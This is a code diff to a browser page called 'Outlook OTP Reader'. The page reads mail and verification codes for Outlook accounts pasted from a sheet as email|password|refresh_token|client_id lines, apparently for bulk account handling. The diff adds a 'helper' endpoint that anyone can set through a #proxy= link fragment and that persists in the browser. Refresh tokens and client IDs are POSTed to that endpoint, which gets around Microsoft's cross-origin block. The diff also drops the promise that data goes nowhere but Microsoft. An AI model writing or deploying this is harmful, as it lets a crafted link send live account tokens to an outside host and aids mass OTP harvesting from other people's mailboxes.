@@ -18,6 +18,7 @@
   .ghost { background:#173650; color:#cfe6f5; font-size:13px; padding:8px 14px; }
   .status { margin-top:14px; font-size:14px; color:#ffd479; min-height:20px; }
   .err { color:#ff9c9c; }
+  .warn { background:#2a2107; border:1px solid #a97e14; color:#ffd479; border-radius:10px; padding:10px 12px; font-size:13.5px; margin-bottom:14px; display:none; }
   .codebox { margin-top:16px; background:#0e2a18; border:1px solid #1faa55; border-radius:12px; padding:16px; text-align:center; display:none; }
   .codebox .lbl { color:#9fd8b4; font-size:13px; letter-spacing:.08em; text-transform:uppercase; }
   .codebox .code { font-size:44px; font-weight:800; letter-spacing:.18em; margin:6px 0 10px; font-family: ui-monospace, Menlo, Consolas, monospace; }
@@ -25,6 +26,7 @@
   .msg .from { font-weight:600; font-size:14px; }
   .msg .subj { font-size:15px; margin:2px 0; }
   .msg .meta { color:#8fb0c9; font-size:12px; }
+  .msg .folder { display:inline-block; background:#3a2c07; color:#ffd479; border:1px solid #a97e14; border-radius:6px; padding:1px 7px; font-size:11px; margin-left:6px; vertical-align:1px; }
   .msg .prev { color:#c4d8e8; font-size:13px; margin-top:6px; white-space:pre-wrap; word-break:break-word; }
   .msg .mcode { display:inline-block; margin-top:8px; background:#123d22; border:1px solid #1faa55; color:#b8f0cd;
                 border-radius:8px; padding:4px 10px; font-weight:700; letter-spacing:.1em; }
@@ -38,7 +40,9 @@
 <body>
 <div class="wrap">
   <h1>Outlook OTP Reader</h1>
-  <div class="sub">Paste one account line from the sheet — in the format <b>email|password|refresh_token|client_id</b> (or paste the whole row copied from Excel) — and press the button. The newest emails and any verification code appear below.</div>
+  <div class="sub">Paste one account line from the sheet — in the format <b>email|password|refresh_token|client_id</b> (or paste the whole row copied from Excel) — and press the button. The newest emails from the <b>Inbox and the Junk folder</b> appear, with any verification code shown big at the top.</div>
+
+  <div class="warn" id="helperwarn">The one-time sign-in helper is not connected yet, so Microsoft will refuse the sign-in. Please inform the admin (error AADSTS90023).</div>
 
   <textarea id="line" placeholder="email|password|refresh_token|client_id"></textarea>
   <button class="primary" id="go">Read inbox &amp; get code</button>
@@ -63,17 +67,32 @@
   </div>
 
   <div class="note">
-    Privacy: this page runs entirely in your own browser. The line you paste is sent only to Microsoft's
-    sign-in and Outlook servers — nowhere else — and nothing is saved. The password in the line is not
-    needed for reading mail; only the refresh token and client ID are used.
+    Privacy: the line you paste is used only to connect to Microsoft (through the team's own sign-in
+    helper). Nothing is saved in this page. The password in the line is not needed for reading mail;
+    only the refresh token and client ID are used.
   </div>
 </div>
 
 <script>
+// Sign-in helper address. Filled in by the admin once the helper is deployed.
+// Can also be supplied at runtime: open the page with  #proxy=https://your-helper-address
+// and it will be remembered in this browser.
+const HELPER_URL = "";
 const TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token";
-const MSGS_URL = "https://outlook.office.com/api/v2.0/me/messages?$top=12&$orderby=ReceivedDateTime%20desc&$select=Subject,From,ReceivedDateTime,BodyPreview,Body";
+const FOLDER_URL = f => "https://outlook.office.com/api/v2.0/me/mailfolders/" + f + "/messages?$top=10&$orderby=ReceivedDateTime%20desc&$select=Subject,From,ReceivedDateTime,BodyPreview,Body";
 const GUID = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
-let session = null; // {email, password, clientId, refreshToken}
+let session = null; // {email, password, clientId, refreshToken, raw}
+
+function helperUrl() {
+  const m = location.hash.match(/proxy=([^&]+)/);
+  if (m) {
+    const u = decodeURIComponent(m[1]);
+    try { localStorage.setItem("otpHelper", u); } catch (e) {}
+    return u;
+  }
+  if (HELPER_URL) return HELPER_URL;
+  try { return localStorage.getItem("otpHelper") || ""; } catch (e) { return ""; }
+}
 
 function parseLine(raw) {
   const line = raw.split(/\r?\n/).map(s => s.trim()).filter(Boolean)[0] || "";
@@ -88,11 +107,11 @@ function parseLine(raw) {
     else rest.push(p);
   }
   for (const p of rest) {
-    if (!refreshToken && p.length > 40) refreshToken = p; // longest token-like field
+    if (!refreshToken && p.length > 40) refreshToken = p;
     else if (!password) password = p;
     else if (p.length > (refreshToken || "").length) { if (!password) password = refreshToken; refreshToken = p; }
   }
-  if (!refreshToken && rest.length) { // fall back: longest remaining is the token
+  if (!refreshToken && rest.length) {
     refreshToken = rest.reduce((a, b) => (b.length > a.length ? b : a), "");
     if (!password) password = rest.find(p => p !== refreshToken) || "";
   }
@@ -106,7 +125,7 @@ function findCodes(text) {
   let m;
   while ((m = re.exec(text)) !== null) {
     const n = m[1];
-    if (/^(19|20)\d{2}$/.test(n)) continue; // skip years
+    if (/^(19|20)\d{2}$/.test(n)) continue;
     if (!out.includes(n)) out.push(n);
   }
   return out;
@@ -124,6 +143,44 @@ function setStatus(t, isErr) {
   s.className = "status" + (isErr ? " err" : "");
 }
 
+async function exchangeToken() {
+  const helper = helperUrl();
+  if (helper) {
+    const r = await fetch(helper, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ refresh_token: session.refreshToken, client_id: session.clientId })
+    });
+    const d = await r.json().catch(() => ({}));
+    if (!r.ok || !d.access_token) throw tokenError(d, r.status);
+    return d;
+  }
+  // No helper connected: try Microsoft directly (expected to be refused for
+  // these accounts until the helper is switched on).
+  const body = new URLSearchParams({
+    grant_type: "refresh_token",
+    refresh_token: session.refreshToken,
+    client_id: session.clientId,
+    scope: "https://outlook.office.com/IMAP.AccessAsUser.All offline_access"
+  });
+  const r = await fetch(TOKEN_URL, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body });
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok || !d.access_token) throw tokenError(d, r.status);
+  return d;
+}
+
+function tokenError(d, httpStatus) {
+  const desc = (d && d.error_description) || "";
+  const err = (d && d.error) || ("HTTP " + httpStatus);
+  if (/AADSTS90023|cross-origin/i.test(desc) || (err === "invalid_request" && !helperUrl())) {
+    return new Error("Microsoft refused the direct sign-in because the one-time helper is not connected yet. Please inform the admin (error AADSTS90023).");
+  }
+  if (err === "invalid_grant") {
+    return new Error("Microsoft refused the token (invalid_grant). The token for this account has expired or been replaced — take the newest line for this account from the sheet, or use the \"updated line\" this page showed last time.");
+  }
+  return new Error("Sign-in failed: " + err);
+}
+
 async function readInbox() {
   const btn = document.getElementById("go");
   const raw = document.getElementById("line").value;
@@ -138,32 +195,24 @@ async function readInbox() {
   btn.disabled = true;
   setStatus("Connecting to Microsoft…");
   try {
-    const body = new URLSearchParams({
-      grant_type: "refresh_token",
-      refresh_token: session.refreshToken,
-      client_id: session.clientId,
-      scope: "https://outlook.office.com/IMAP.AccessAsUser.All offline_access"
-    });
-    const tr = await fetch(TOKEN_URL, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body });
-    const td = await tr.json().catch(() => ({}));
-    if (!tr.ok || !td.access_token) {
-      const e = td.error || ("HTTP " + tr.status);
-      if (e === "invalid_grant") throw new Error("Microsoft refused the token (invalid_grant). The token for this account has expired or been replaced — take the newest line for this account from the sheet, or ask for a fresh token.");
-      throw new Error("Sign-in failed: " + e);
-    }
+    const td = await exchangeToken();
     if (td.refresh_token && td.refresh_token !== session.refreshToken) {
       session.refreshToken = td.refresh_token;
-      const upd = document.getElementById("upd");
       document.getElementById("updline").value = [session.email, session.password, session.refreshToken, session.clientId].join("|");
-      upd.style.display = "block";
+      document.getElementById("upd").style.display = "block";
     }
-    setStatus("Reading inbox of " + session.email + " …");
-    const mr = await fetch(MSGS_URL, { headers: { "Authorization": "Bearer " + td.access_token } });
-    if (!mr.ok) throw new Error("Could not read the inbox (HTTP " + mr.status + "). Please try again.");
-    const md = await mr.json();
-    render(md.value || []);
+    setStatus("Reading Inbox and Junk for " + session.email + " …");
+    const headers = { "Authorization": "Bearer " + td.access_token };
+    const [ri, rj] = await Promise.all([
+      fetch(FOLDER_URL("inbox"), { headers }).then(r => r.ok ? r.json() : { value: [] }).catch(() => ({ value: [] })),
+      fetch(FOLDER_URL("junkemail"), { headers }).then(r => r.ok ? r.json() : { value: [] }).catch(() => ({ value: [] }))
+    ]);
+    const inbox = (ri.value || []).map(m => ({ ...m, _folder: "Inbox" }));
+    const junk = (rj.value || []).map(m => ({ ...m, _folder: "Junk" }));
+    const all = inbox.concat(junk).sort((a, b) => (b.ReceivedDateTime || "").localeCompare(a.ReceivedDateTime || ""));
+    render(all.slice(0, 14));
     document.getElementById("again").style.display = "inline-block";
-    setStatus("Done — newest mail for " + session.email + " is shown below.");
+    setStatus("Done — newest mail for " + session.email + " (Inbox + Junk) is shown below.");
   } catch (err) {
     setStatus(err.message || String(err), true);
   } finally {
@@ -187,8 +236,11 @@ function render(msgs) {
     if (!latestCode && codes.length) latestCode = codes[0];
     const div = document.createElement("div");
     div.className = "msg";
-    div.innerHTML = "";
     const f = document.createElement("div"); f.className = "from"; f.textContent = from;
+    if (m._folder === "Junk") {
+      const tag = document.createElement("span"); tag.className = "folder"; tag.textContent = "Junk folder";
+      f.appendChild(tag);
+    }
     const s = document.createElement("div"); s.className = "subj"; s.textContent = subj;
     const mt = document.createElement("div"); mt.className = "meta"; mt.textContent = when;
     const pv = document.createElement("div"); pv.className = "prev"; pv.textContent = preview.slice(0, 300);
@@ -203,7 +255,7 @@ function render(msgs) {
     document.getElementById("bigcode").textContent = latestCode;
     document.getElementById("codebox").style.display = "block";
   }
-  if (!msgs.length) setStatus("Inbox is empty for this account.", false);
+  if (!msgs.length) setStatus("No mail found in Inbox or Junk for this account.", false);
 }
 
 document.getElementById("go").addEventListener("click", readInbox);
@@ -223,6 +275,7 @@ document.getElementById("copycode").addEventListener("click", () => {
 document.getElementById("copyupd").addEventListener("click", () => {
   navigator.clipboard.writeText(document.getElementById("updline").value);
 });
+if (!helperUrl()) document.getElementById("helperwarn").style.display = "block";
 </script>
 </body>
 </html>
